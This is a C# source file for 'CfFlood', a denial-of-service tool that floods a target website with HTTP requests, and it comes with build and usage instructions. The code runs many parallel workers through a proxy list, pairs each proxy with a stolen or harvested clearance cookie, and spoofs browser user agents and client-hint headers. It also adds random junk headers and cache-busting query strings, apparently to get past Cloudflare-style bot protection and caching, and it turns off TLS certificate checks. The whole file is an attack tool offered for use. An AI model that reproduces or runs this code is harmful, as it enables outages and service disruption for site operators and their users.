// CfFlood.cs
// Compile: dotnet new console -n CfFlood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <rps> <duration> <proxyFile> <cookieFile> [--threads N]

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class CfFlood
{
    static readonly Random _rand = new Random();
    static string _targetUrl;
    static int _rps;               // requests per second per thread
    static int _floodDurationSec;
    static string _proxyFile;
    static string _cookieFile;
    static int _threads = 10;      // number of parallel flood tasks
    static Dictionary<string, string> _proxyCookieMap;

    // Language headers (same as Node.js)
    static readonly string[] _langHeaders = {
        "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
        "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9"
    };

    static readonly string[] _acceptHeaders = {
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    };

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: CfFlood <target> <rps> <duration> <proxyFile> <cookieFile> [--threads N]");
            Console.WriteLine("Example: dotnet run -- https://example.com 100 60 proxies.txt cookies.txt --threads 20");
            return;
        }

        _targetUrl = args[0];
        _rps = int.Parse(args[1]);
        _floodDurationSec = int.Parse(args[2]);
        _proxyFile = args[3];
        _cookieFile = args[4];

        for (int i = 5; i < args.Length; i++)
        {
            if (args[i] == "--threads" && i + 1 < args.Length)
                _threads = int.Parse(args[++i]);
        }

        // Load proxies and cookies (each line: proxy_ip:port,cookie_string)
        var proxies = File.ReadAllLines(_proxyFile)
            .Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#"))
            .Select(l => l.Trim())
            .ToArray();

        var cookieLines = File.ReadAllLines(_cookieFile)
            .Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#"))
            .Select(l => l.Trim().Split(','))
            .ToDictionary(parts => parts[0], parts => parts.Length > 1 ? parts[1] : null);

        _proxyCookieMap = proxies
            .Where(p => cookieLines.ContainsKey(p) && !string.IsNullOrEmpty(cookieLines[p]))
            .ToDictionary(p => p, p => cookieLines[p]);

        if (_proxyCookieMap.Count == 0)
        {
            Console.WriteLine("[!] No valid proxy+cookie pairs found. Check your files.");
            return;
        }

        Console.WriteLine($"\n[🔥] CF Flood | Target: {_targetUrl}");
        Console.WriteLine($"     Duration: {_floodDurationSec}s | RPS: {_rps} | Threads: {_threads}");
        Console.WriteLine($"     Loaded {_proxyCookieMap.Count} proxy+cookie pairs.\n");

        var cts = new CancellationTokenSource();
        var tasks = new List<Task>();
        var counter = new ConcurrentDictionary<int, long>();

        // Start flood tasks (each task uses one proxy+cookie)
        var entries = _proxyCookieMap.ToList();
        for (int i = 0; i < _threads; i++)
        {
            int idx = i;
            var entry = entries[idx % entries.Count];
            tasks.Add(Task.Run(() => FloodWorker(idx, entry.Key, entry.Value, cts.Token, counter)));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counter)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {kv.Value}");
                    counter[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_floodDurationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Flood finished.");
    }

    static async Task FloodWorker(int id, string proxy, string cookie, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        var uri = new Uri(_targetUrl);
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        // Set proxy (simple HTTP CONNECT)
        if (!string.IsNullOrEmpty(proxy))
        {
            var proxyParts = proxy.Split(':');
            if (proxyParts.Length == 2)
            {
                handler.Proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));
                handler.UseProxy = true;
            }
        }

        using var client = new HttpClient(handler);
        client.DefaultRequestHeaders.Clear();
        client.DefaultRequestHeaders.Add("User-Agent", RandomUserAgent());
        client.DefaultRequestHeaders.Add("Accept", RandomElement(_acceptHeaders));
        client.DefaultRequestHeaders.Add("Accept-Language", RandomElement(_langHeaders));
        client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br, zstd");
        client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
        client.DefaultRequestHeaders.Add("Te", "trailers");
        client.DefaultRequestHeaders.Add("Cookie", cookie);

        // Chrome version
        string chromeVer = _rand.Next(115, 130).ToString();
        client.DefaultRequestHeaders.Add("sec-ch-ua", $"\"Chromium\";v=\"{chromeVer}\", \"Not)A;Brand\";v=\"8\", \"Chrome\";v=\"{chromeVer}\"");
        client.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
        client.DefaultRequestHeaders.Add("sec-ch-ua-platform", "Windows");

        // Add random dynamic headers (like original)
        if (_rand.NextDouble() < 0.3)
            client.DefaultRequestHeaders.Add($"purpure-secretf-id", $"formula-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.5)
            client.DefaultRequestHeaders.Add($"sec-stake-fommunity", "bet-clc");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"{RandomString(1,2)}-SElF-DYNAMIC-{RandomString(1,2)}", $"zero-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"stringclick-bad-{RandomString(1,2)}", $"router-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"root-user{RandomString(1,2)}", $"root-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"Java-x-seft{RandomString(1,2)}", $"zero-{RandomString(1,2)}");

        // Cache-busting query
        string baseUri = uri.ToString();
        string randomQuery = (baseUri.Contains('?') ? "&" : "?") + $"_={Guid.NewGuid():N}&rnd={_rand.Next(1000000)}";
        string requestUri = baseUri + randomQuery;

        int intervalMs = 1000 / _rps;
        var sw = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _floodDurationSec)
        {
            try
            {
                using var response = await client.GetAsync(requestUri, HttpCompletionOption.ResponseHeadersRead, ct);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch { /* ignore */ }

            await Task.Delay(intervalMs, ct);
        }
    }

    static string RandomUserAgent()
    {
        var uas = new[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        };
        return uas[_rand.Next(uas.Length)];
    }

    static T RandomElement<T>(T[] arr) => arr[_rand.Next(arr.Length)];

    static string RandomString(int minLen, int maxLen)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int len = _rand.Next(minLen, maxLen + 1);
        return new string(Enumerable.Repeat(chars, len).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }
}
